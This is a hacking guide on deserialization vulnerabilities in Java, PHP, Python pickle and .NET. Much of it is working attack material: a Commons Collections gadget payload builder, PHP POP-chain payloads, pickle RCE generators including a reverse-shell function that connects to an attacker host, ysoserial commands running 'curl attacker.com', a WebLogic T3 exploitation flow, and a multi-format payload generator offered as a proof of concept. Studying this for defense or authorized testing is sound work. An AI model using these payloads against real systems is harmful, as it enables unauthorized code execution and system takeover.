# Deserialization Vulnerability Guide

A practical guide for understanding and hunting deserialization vulnerabilities—where untrusted data is converted back into live objects, enabling code execution.

## Table of Contents

- [Overview](#overview)
- [The Fundamental Pattern](#the-fundamental-pattern)
- [Java Deserialization Deep Dive](#java-deserialization-deep-dive)
  - [How Java Serialization Works](#how-java-serialization-works)
  - [Gadget Chains Explained](#gadget-chains-explained)
  - [Commons Collections Exploit](#commons-collections-exploit)
- [PHP Deserialization Deep Dive](#php-deserialization-deep-dive)
  - [Magic Methods](#magic-methods)
  - [POP Chains](#pop-chains)
- [Python Pickle Deep Dive](#python-pickle-deep-dive)
- [.NET Deserialization](#net-deserialization)
- [Pattern Recognition: Where Else to Look](#pattern-recognition-where-else-to-look)
- [Attack Surfaces](#attack-surfaces)
- [Tools & Methodology](#tools--methodology)
- [Legal & Ethical Considerations](#legal--ethical-considerations)

---

## Overview

Deserialization vulnerabilities occur when an application converts untrusted serialized data back into objects. If the attacker controls the serialized data, they can instantiate arbitrary objects, manipulate their properties, and trigger dangerous methods during reconstruction.

### Foundational Examples

| CVE | Product | Language | Impact |
|-----|---------|----------|--------|
| CVE-2015-4852 | WebLogic | Java | RCE via Commons Collections |
| CVE-2017-9805 | Apache Struts | Java | RCE via REST plugin |
| CVE-2019-6340 | Drupal | PHP | RCE via REST API |
| CVE-2020-9484 | Apache Tomcat | Java | RCE via session persistence |
| CVE-2021-21972 | VMware vCenter | Java | RCE via file upload |
| CVE-2023-34362 | MOVEit Transfer | .NET | RCE via deserialization |

### Why These Bugs Keep Recurring

- **Serialization is convenient** — Developers use it everywhere
- **Data looks opaque** — Base64 blobs seem safe
- **Libraries contain gadgets** — Common dependencies enable exploitation
- **Legacy protocols** — RMI, JMX, T3 use serialization by design
- **Framework magic** — Auto-binding creates unexpected objects

---

## The Fundamental Pattern

```
THE CORE CONCEPT:

SERIALIZATION (safe):
┌─────────────────┐         ┌─────────────────────────┐
│   Live Object   │ ──────► │ Byte Stream / String    │
│   {type, data}  │ encode  │ (can be stored/sent)    │
└─────────────────┘         └─────────────────────────┘


DESERIALIZATION (dangerous):
┌─────────────────────────┐         ┌─────────────────┐
│ Byte Stream / String    │ ──────► │   Live Object   │
│ (attacker controlled)   │ decode  │   (EXECUTES!)   │
└─────────────────────────┘         └─────────────────┘

THE DANGER:
Deserialization can EXECUTE CODE as part of 
reconstructing the object. Attacker controls:
  1. WHAT type of object gets created
  2. WHAT data populates its fields
  3. WHAT methods run during reconstruction
```

### The Three Deserialization Attack Patterns

```
PATTERN 1: DIRECT CODE IN SERIALIZED DATA
─────────────────────────────────────────────────────────
Some formats (Python pickle) allow embedded code:

    Serialized: "Run os.system('whoami')"
    Deserialize: Actually executes os.system('whoami')

Language: Python (pickle), Ruby (Marshal)


PATTERN 2: GADGET CHAINS (Object Chaining)
─────────────────────────────────────────────────────────
Chain existing classes to reach dangerous functionality:

    Object A.finalize() → calls B.compare()
    Object B.compare() → calls C.transform()
    Object C.transform() → calls Runtime.exec()

Language: Java, .NET, PHP


PATTERN 3: PROPERTY-ORIENTED PROGRAMMING
─────────────────────────────────────────────────────────
Abuse magic methods triggered by deserialization:

    __wakeup() → called when unserialized
    __destruct() → called when object destroyed
    __toString() → called when cast to string

Language: PHP
```

---

## Java Deserialization Deep Dive

Java deserialization vulnerabilities are devastating because:
- Java serialization is binary but deterministic
- Many libraries contain "gadget" classes
- Enterprise apps have deep dependency trees
- RCE is often possible, not just crashes

### How Java Serialization Works

```
SERIALIZED JAVA OBJECT (hex):
─────────────────────────────────────────────────────────

AC ED 00 05 73 72 00 17 6A 61 76 61 2E 75 74 69
│     │     │  │  │     │
│     │     │  │  │     └─ Class name: "java.util..." 
│     │     │  │  └─ Length of class name (0x17 = 23)
│     │     │  └─ TC_STRING (0x74) or TC_CLASSDESC
│     │     └─ TC_OBJECT (0x73) - new object follows
│     └─ Version (00 05)
└─ Magic bytes "AC ED" - JAVA SERIALIZED OBJECT

MAGIC BYTES TO SEARCH FOR:
  Hex:    AC ED 00 05
  Base64: rO0AB (starts with this)
  
Finding these in network traffic, files, cookies = target
```

### Object Reconstruction Process

```
WHEN JAVA DESERIALIZES:
─────────────────────────────────────────────────────────

1. Read class descriptor from stream
2. Load class (must exist on classpath)
3. Allocate object WITHOUT calling constructor
4. Read field values from stream
5. Populate fields via reflection
6. Call readObject() if defined  ← ATTACKER CODE PATH
7. Call readResolve() if defined ← ATTACKER CODE PATH

DANGEROUS CLASSES define readObject():
  - Performs operations during deserialization
  - Operations use attacker-controlled field values
  - Chain multiple such classes = RCE
```

### Gadget Chains Explained

A gadget chain links classes together where:
- Each class has a method triggered during deserialization
- That method calls another method on a field
- The field is another serialized object (attacker controlled)
- Eventually reaches dangerous sink (Runtime.exec, etc.)

```
GADGET CHAIN VISUALIZATION:
─────────────────────────────────────────────────────────

┌─────────────────────────────────────────────────────────┐
│ Entry Point: HashMap.readObject()                       │
│   Calls: key.hashCode()                                 │
│   Key is: TiedMapEntry                                  │
└─────────────────┬───────────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────────┐
│ TiedMapEntry.hashCode()                                 │
│   Calls: map.get(key)                                   │
│   Map is: LazyMap                                       │
└─────────────────┬───────────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────────┐
│ LazyMap.get()                                           │
│   Calls: factory.transform(key)                         │
│   Factory is: ChainedTransformer                        │
└─────────────────┬───────────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────────┐
│ ChainedTransformer.transform()                          │
│   Calls each transformer in chain:                      │
│   1. ConstantTransformer → returns Runtime.class        │
│   2. InvokerTransformer → calls getMethod("getRuntime") │
│   3. InvokerTransformer → calls invoke() → getRuntime() │
│   4. InvokerTransformer → calls exec("whoami")          │
└─────────────────────────────────────────────────────────┘

RESULT: HashMap.readObject() → Runtime.exec("whoami")
```

### Commons Collections Exploit

The most famous Java gadget chain uses Apache Commons Collections.

```java
/*
 * Simplified Commons Collections 3.1 Gadget
 * For educational purposes only
 */

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import java.util.*;

public class CommonsCollectionsPayload {
    
    public static Object getPayload(String command) throws Exception {
        
        // Build transformer chain that executes command
        Transformer[] transformers = new Transformer[] {
            // Return Runtime.class
            new ConstantTransformer(Runtime.class),
            
            // Call Runtime.getMethod("getRuntime")
            new InvokerTransformer("getMethod", 
                new Class[] {String.class, Class[].class}, 
                new Object[] {"getRuntime", new Class[0]}),
            
            // Call method.invoke(null) to get Runtime instance
            new InvokerTransformer("invoke", 
                new Class[] {Object.class, Object[].class}, 
                new Object[] {null, new Object[0]}),
            
            // Call runtime.exec(command)
            new InvokerTransformer("exec", 
                new Class[] {String.class}, 
                new Object[] {command})
        };
        
        // Chain them together
        Transformer chain = new ChainedTransformer(transformers);
        
        // Wrap in LazyMap - transform() called on get()
        Map lazyMap = LazyMap.decorate(new HashMap(), chain);
        
        // Create TiedMapEntry - hashCode() calls map.get()
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
        
        // Create HashSet - readObject() calls entry.hashCode()
        HashSet set = new HashSet(1);
        set.add("placeholder");
        
        // Use reflection to replace placeholder with entry
        Field f = HashSet.class.getDeclaredField("map");
        f.setAccessible(true);
        HashMap innerMap = (HashMap) f.get(set);
        
        Field f2 = HashMap.class.getDeclaredField("table");
        f2.setAccessible(true);
        Object[] table = (Object[]) f2.get(innerMap);
        
        // Find and replace entry
        for (int i = 0; i < table.length; i++) {
            if (table[i] != null) {
                Field keyField = table[i].getClass().getDeclaredField("key");
                keyField.setAccessible(true);
                keyField.set(table[i], entry);
            }
        }
        
        return set;  // Serialize this → RCE on deserialize
    }
}
```

### Java Serialization Attack Flow

```
ATTACK FLOW:
─────────────────────────────────────────────────────────

1. RECONNAISSANCE
   - Identify Java application (headers, errors, stack traces)
   - Find serialized data (Base64 rO0AB, cookies, parameters)
   - Enumerate libraries (error messages, /WEB-INF/lib)

2. GENERATE PAYLOAD
   $ java -jar ysoserial.jar CommonsCollections5 'curl attacker.com'
   
   Output: Serialized byte stream containing gadget chain

3. ENCODE & DELIVER
   $ cat payload | base64 > encoded_payload
   
   Send via:
   - Cookie value
   - POST parameter
   - HTTP header
   - WebSocket message
   - JMX/RMI/T3 protocol

4. EXECUTION
   Application calls ObjectInputStream.readObject()
   Gadget chain executes → Command runs
```

### Real-World CVE: CVE-2015-4852 (WebLogic)

```
VULNERABLE ENDPOINT: T3 Protocol (port 7001)
─────────────────────────────────────────────────────────

T3 is WebLogic's proprietary protocol for:
  - RMI communication
  - Cluster messaging
  - Admin operations

T3 HANDSHAKE:
  Client: "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n"
  Server: "HELO:12.2.1.0.0...."

AFTER HANDSHAKE:
  Client sends serialized Java objects
  Server deserializes them automatically
  
EXPLOIT:
  1. Complete T3 handshake
  2. Send ysoserial payload (Commons Collections)
  3. WebLogic deserializes → RCE

NO AUTHENTICATION REQUIRED
```

---

## PHP Deserialization Deep Dive

PHP deserialization exploits "magic methods"—special functions automatically called during object lifecycle.

### PHP Serialization Format

```php
<?php
class User {
    public $name = "admin";
    public $isAdmin = true;
    private $password = "secret";
}

$user = new User();
echo serialize($user);

/* Output:
O:4:"User":3:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;s:14:"\0User\0password";s:6:"secret";}

BREAKDOWN:
O:4:"User"     = Object, class name length 4, class "User"
:3:            = 3 properties
{...}          = Property definitions

s:4:"name"     = String key, length 4, "name"
s:5:"admin"    = String value, length 5, "admin"

b:1            = Boolean true
b:0            = Boolean false

\0User\0       = Private property marker (null bytes)
*/
```

### Magic Methods

```php
<?php
class Dangerous {
    public $command;
    
    // Called when serialize() is used
    public function __sleep() {
        return ['command'];
    }
    
    // Called when unserialize() is used ← ATTACK VECTOR
    public function __wakeup() {
        system($this->command);  // Executes attacker command!
    }
    
    // Called when object is destroyed ← ATTACK VECTOR
    public function __destruct() {
        system($this->command);
    }
    
    // Called when object used as string
    public function __toString() {
        return file_get_contents($this->command);
    }
}

// Attacker payload:
$payload = 'O:9:"Dangerous":1:{s:7:"command";s:6:"whoami";}';
unserialize($payload);  // Executes whoami!
```

### POP Chains (Property-Oriented Programming)

When no single class gives direct RCE, chain multiple classes:

```php
<?php
// Available classes in application:

class FileWriter {
    public $filename;
    public $content;
    
    public function __destruct() {
        file_put_contents($this->filename, $this->content);
    }
}

class Logger {
    public $handler;
    
    public function __destruct() {
        $this->handler->close();
    }
}

class Connection {
    public $callback;
    public $args;
    
    public function close() {
        call_user_func_array($this->callback, $this->args);
    }
}

/* POP CHAIN:
   
   1. Unserialize Logger
   2. Logger.__destruct() calls handler.close()
   3. handler = Connection
   4. Connection.close() calls call_user_func_array()
   5. callback = "system", args = ["whoami"]
   6. RCE!
*/

$conn = new Connection();
$conn->callback = "system";
$conn->args = ["whoami"];

$logger = new Logger();
$logger->handler = $conn;

$payload = serialize($logger);
// O:6:"Logger":1:{s:7:"handler";O:10:"Connection":2:{s:8:"callback";s:6:"system";s:4:"args";a:1:{i:0;s:6:"whoami";}}}
```

### PHP Deserialization Sinks

```
DANGEROUS FUNCTIONS REACHABLE VIA POP CHAINS:
─────────────────────────────────────────────────────────

Command Execution:
  system(), exec(), passthru(), shell_exec()
  popen(), proc_open()
  pcntl_exec()
  
Code Execution:
  eval(), assert() (PHP < 8)
  create_function()
  call_user_func(), call_user_func_array()
  preg_replace() with /e flag (PHP < 7)
  
File Operations:
  file_put_contents(), fwrite()
  include(), require()
  move_uploaded_file()
  
Database:
  mysqli_query(), PDO::query()
```

---

## Python Pickle Deep Dive

Python's pickle module is inherently dangerous—it can execute arbitrary code during deserialization by design.

### How Pickle Works

```python
"""
Pickle uses a stack-based VM with opcodes.
Attacker can embed arbitrary code execution.
"""

import pickle
import base64

# Normal serialization
data = {"user": "admin", "role": "user"}
serialized = pickle.dumps(data)
print(base64.b64encode(serialized))
# b'gASVIQAAAAAAAAB9lCiMBHVzZXKUjAVhZG1LZZaUjARyb2xllIwEdXNlcpR1Lg=='

# Malicious serialization
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('whoami',))

malicious = pickle.dumps(Exploit())
# When unpickled: calls os.system('whoami')
```

### Pickle Opcodes

```
PICKLE VM OPCODES (simplified):
─────────────────────────────────────────────────────────

c  = GLOBAL: Push module.name onto stack
(  = MARK: Push mark onto stack
t  = TUPLE: Build tuple from mark to stack top
R  = REDUCE: Call callable with args (RCE!)
.  = STOP: End of pickle

MALICIOUS PICKLE (disassembled):

    0: c    GLOBAL     'os system'
    9: (    MARK
   10: S    STRING     'whoami'
   20: t    TUPLE      (MARK at 9)
   21: R    REDUCE     (call os.system with ('whoami',))
   22: .    STOP

This is literally: os.system('whoami')
```

### Crafting Pickle Exploits

```python
#!/usr/bin/env python3
"""
Pickle exploit payload generator
For educational purposes only
"""

import pickle
import base64
import pickletools

class PickleExploit:
    """Generic pickle RCE via __reduce__"""
    
    def __init__(self, module, function, *args):
        self.module = module
        self.function = function
        self.args = args
    
    def __reduce__(self):
        import importlib
        mod = importlib.import_module(self.module)
        func = getattr(mod, self.function)
        return (func, self.args)


def generate_payload(command):
    """Generate pickle payload for command execution"""
    
    class Payload:
        def __reduce__(self):
            import os
            return (os.system, (command,))
    
    payload = pickle.dumps(Payload())
    return payload


def generate_reverse_shell(host, port):
    """Generate pickle payload for reverse shell"""
    
    code = f'''import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'''
    
    class Payload:
        def __reduce__(self):
            return (exec, (code,))
    
    return pickle.dumps(Payload())


if __name__ == '__main__':
    # Example: command execution
    payload = generate_payload('id')
    print("Base64 payload:")
    print(base64.b64encode(payload).decode())
    
    print("\nPickle disassembly:")
    pickletools.dis(payload)
```

### Where Pickle is Used

```
COMMON PICKLE LOCATIONS:
─────────────────────────────────────────────────────────

Flask Sessions:
  - Flask uses pickle for session serialization (with signing)
  - If SECRET_KEY leaked → forge sessions with pickle RCE
  - Cookie: session=eyJ... (base64 pickle after signature)

Redis/Memcached:
  - Frameworks cache pickled objects
  - Redis key poisoning → pickle RCE

Celery Tasks:
  - Task arguments can be pickled
  - Inject malicious task → RCE on worker

Machine Learning:
  - Model files (.pkl, .pickle) 
  - Loading untrusted models = RCE

Scientific Python:
  - NumPy .npy files can contain pickled objects
  - Joblib .joblib files use pickle

Django:
  - Signed cookies can use pickle (older versions)
  - Session backend can use pickle
```

---

## .NET Deserialization

.NET has multiple serialization mechanisms, each with vulnerabilities.

### BinaryFormatter (Most Dangerous)

```csharp
// VULNERABLE: Deserializing untrusted data
BinaryFormatter bf = new BinaryFormatter();
object obj = bf.Deserialize(untrustedStream);  // RCE!

// .NET gadgets exist similar to Java
// Tools: ysoserial.net generates payloads
```

### .NET Gadget Example

```
TYPCONFUSEDELEGATE GADGET (simplified):
─────────────────────────────────────────────────────────

1. Sorted{List,Set} comparer calls Compare()
2. Compare is a delegate (function pointer)
3. Delegate points to Process.Start()
4. Comparison argument is attacker command

SERIALIZED PAYLOAD:
  - SortedSet<string> with 2 elements
  - Custom Comparer that's a TypeConfuseDelegate
  - Delegate wrapping Process.Start
  - Elements: "cmd", "/c whoami"

DESERIALIZATION:
  SortedSet reconstructed
  Calls comparer.Compare("cmd", "/c whoami")
  Actually calls Process.Start("cmd", "/c whoami")
```

### Dangerous .NET Formatters

```
FORMATTER            DANGER LEVEL    NOTES
─────────────────────────────────────────────────────────
BinaryFormatter      CRITICAL        RCE, deprecated
NetDataContractSer   CRITICAL        Similar to BinaryFormatter
SoapFormatter        CRITICAL        XML-based but same issues
ObjectStateFormatter HIGH            ViewState uses this
LosFormatter         HIGH            Used in ASP.NET
JavaScriptSerializer MEDIUM          Type parameter enables RCE
Json.NET             MEDIUM          TypeNameHandling setting
DataContractSerializer LOW           Safer but still has issues
XmlSerializer        LOW             Type must be expected
```

### ViewState Attacks (ASP.NET)

```
VIEWSTATE STRUCTURE:
─────────────────────────────────────────────────────────

<input type="hidden" name="__VIEWSTATE" 
       value="BASE64_ENCODED_SERIALIZED_STATE" />

If MAC validation disabled or key leaked:
  - Forge ViewState with malicious serialized object
  - Server deserializes → RCE

DETECTION:
  - ViewState without MAC: Starts with /wE
  - ViewState with MAC: Ends with == and has signature

EXPLOIT:
  ysoserial.net -g TypeConfuseDelegate \
                -f LosFormatter \
                -c "whoami" \
                --raw
```

---

## Pattern Recognition: Where Else to Look

### Serialization Format Detection

```
FORMAT          MAGIC/SIGNATURE              LANGUAGES
─────────────────────────────────────────────────────────
Java            AC ED 00 05 (hex)            Java
                rO0AB (base64)
                
PHP             O:, a:, s:, i:, b:          PHP
                (object, array, string...)
                
Python Pickle   \x80\x03, \x80\x04           Python
                gASV (base64 v4)
                
.NET Binary     00 01 00 00 00 FF FF FF FF  .NET

JSON            TypeNameHandling evidence    .NET, Java
                "@type", "$type" keys
                
YAML            !!python/object             Python
                !!ruby/object                Ruby
                
XML             <java>, <object>             Java (XMLDecoder)
```

### Code Patterns to Audit

```java
// JAVA - Search for:
ObjectInputStream.readObject()
XMLDecoder.readObject()
XStream.fromXML()
JSON.parseObject()  // Fastjson
ObjectMapper with enableDefaultTyping()  // Jackson

// PHP - Search for:
unserialize()
yaml_parse()  // If YAML extension
__wakeup, __destruct, __toString  // Gadget candidates

// PYTHON - Search for:
pickle.loads()
pickle.load()
cPickle.loads()
yaml.load()  // Without Loader parameter
joblib.load()

// .NET - Search for:
BinaryFormatter.Deserialize()
NetDataContractSerializer
JavaScriptSerializer with type parameter
Json.NET with TypeNameHandling
```

### Attack Surface by Protocol

```
PROTOCOL/LOCATION        SERIALIZATION      TARGETS
─────────────────────────────────────────────────────────
RMI (Java)              Java native         App servers
JMX                     Java native         Monitoring
T3 (WebLogic)           Java native         WebLogic
JNDI                    Java native         Various
IIOP                    Java native         CORBA apps
HTTP Sessions           Various             Web apps
Cookies                 Various             Web apps
Message Queues          Various             JMS, AMQP apps
Cache Systems           Various             Redis, Memcached
ViewState               .NET                ASP.NET
REST APIs               JSON                APIs with type hints
SOAP                    XML                 Web services
```

---

## Attack Surfaces

### Enterprise Targets

| Product | Protocol | Vulnerability Type |
|---------|----------|-------------------|
| WebLogic | T3, IIOP | Java deserialization |
| JBoss | JMX, HTTP | Java deserialization |
| Jenkins | HTTP | Java deserialization |
| Confluence | HTTP | Java deserialization |
| vCenter | HTTPS | Java deserialization |
| SharePoint | HTTP | .NET deserialization |

### Framework Targets

| Framework | Location | Serialization |
|-----------|----------|---------------|
| Apache Struts | REST plugin | Java |
| Spring | RMI, HTTP Invoker | Java |
| Drupal | REST API | PHP |
| WordPress | Plugins | PHP |
| Flask | Sessions | Python pickle |
| Django | Sessions, caching | Python pickle |

### Detection Methods

```bash
# Search for Java serialized data in traffic
grep -r "rO0AB" ./captures/
xxd capture.pcap | grep -i "aced 0005"

# Search for PHP serialization
grep -rE "O:[0-9]+:" ./logs/

# Search source for dangerous patterns
grep -rn "ObjectInputStream\|readObject" ./src/
grep -rn "unserialize" ./src/
grep -rn "pickle\.load" ./src/
```

---

## Tools & Methodology

### Payload Generation

```bash
# Java payloads (ysoserial)
java -jar ysoserial.jar CommonsCollections5 'curl attacker.com'
java -jar ysoserial.jar CommonsCollections7 'curl attacker.com' | base64

# .NET payloads (ysoserial.net)  
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "whoami"
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"

# PHP payloads (PHPGGC)
phpggc Monolog/RCE1 system whoami
phpggc Laravel/RCE1 system whoami

# Python payloads
python -c "import pickle,base64,os; print(base64.b64encode(pickle.dumps(type('',(),{'__reduce__':lambda s:(os.system,('whoami',))}()))))"
```

### Detection & Analysis

```bash
# Identify serialized data
file suspicious_blob

# Analyze Java serialization
java -jar SerializationDumper.jar -r payload.ser

# Analyze pickle
python -c "import pickle,pickletools; pickletools.dis(open('payload.pkl','rb').read())"

# Burp Suite extensions
# - Java Deserialization Scanner
# - Freddy (detects various formats)
```

### Exploitation Workflow

```
1. IDENTIFY SERIALIZATION
   - Find magic bytes in traffic/storage
   - Identify endpoints accepting serialized data
   - Note the format (Java, PHP, Python, .NET)

2. ENUMERATE ENVIRONMENT
   - Identify framework and version
   - List available libraries (for gadgets)
   - Check for known CVEs

3. GENERATE PAYLOAD
   - Select appropriate gadget chain
   - Use ysoserial/phpggc/custom
   - Test with sleep/DNS for blind verification

4. DELIVER & VERIFY
   - Replace legitimate serialized data with payload
   - Monitor for execution (callbacks, time delays)
   - Escalate access
```

---

## Proof of Concept

```python
#!/usr/bin/env python3
"""
Multi-format deserialization payload generator
For educational purposes only - test only on systems you own
"""

import base64
import pickle
import struct

def generate_python_pickle(command):
    """Generate Python pickle RCE payload"""
    
    class Payload:
        def __reduce__(self):
            import os
            return (os.system, (command,))
    
    payload = pickle.dumps(Payload())
    return base64.b64encode(payload).decode()


def generate_php_payload(command):
    """Generate PHP unserialize payload (basic example)"""
    
    # This requires a vulnerable class to exist in the target
    # Real exploits use framework-specific gadgets (PHPGGC)
    
    payload = f'O:8:"Backdoor":1:{{s:3:"cmd";s:{len(command)}:"{command}";}}'
    return base64.b64encode(payload.encode()).decode()


def detect_format(data):
    """Detect serialization format from raw bytes"""
    
    if isinstance(data, str):
        try:
            data = base64.b64decode(data)
        except:
            data = data.encode()
    
    if data[:4] == b'\xac\xed\x00\x05':
        return "Java ObjectInputStream"
    
    if data[:2] in [b'\x80\x03', b'\x80\x04', b'\x80\x05']:
        return "Python Pickle"
    
    if data[:1] in [b'O', b'a', b's', b'i', b'b'] and b':' in data[:10]:
        return "PHP serialize"
    
    if data[:4] == b'\x00\x01\x00\x00':
        return ".NET BinaryFormatter"
    
    return "Unknown"


if __name__ == '__main__':
    print("Python Pickle payload (id command):")
    print(generate_python_pickle('id'))
    
    print("\nPHP payload (requires vulnerable class):")
    print(generate_php_payload('whoami'))
    
    # Test detection
    test_java = base64.b64decode('rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==')
    print(f"\nDetected format: {detect_format(test_java)}")
```

---

## Defenses (For Context)

Understanding defenses helps identify bypasses:

```
DEFENSE                  BYPASS POTENTIAL
─────────────────────────────────────────────────────────
Blacklist classes        New gadgets, obfuscation
Whitelist classes        Find gadgets in allowed classes
Input validation         Encoding tricks
Signature/MAC            Key leakage, crypto attacks
Upgrade libraries        New gadgets discovered regularly
Disable features         Often not fully disabled

BEST DEFENSES (hard to bypass):
- Don't deserialize untrusted data (eliminate the sink)
- Use safe formats (JSON without type hints)
- Strong integrity checks with secret rotation
```

---

## Legal & Ethical Considerations

### Do
- Only test systems you own or have authorization
- Use out-of-band verification (DNS, sleep)
- Follow responsible disclosure

### Don't  
- Execute destructive commands
- Exfiltrate production data
- Leave backdoors

### Relevant Laws
- US: Computer Fraud and Abuse Act (CFAA)
- EU: Computer Misuse Directive
- Deserialization RCE = unauthorized access = serious offense

---

## References

- [ysoserial](https://github.com/frohoff/ysoserial)
- [ysoserial.net](https://github.com/pwntester/ysoserial.net)
- [PHPGGC](https://github.com/ambionics/phpggc)
- [Attacking Java Deserialization](https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/)
- [Friday the 13th: JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks.pdf)

---

*Document Version: 1.0*
*Last Updated: January 2025*
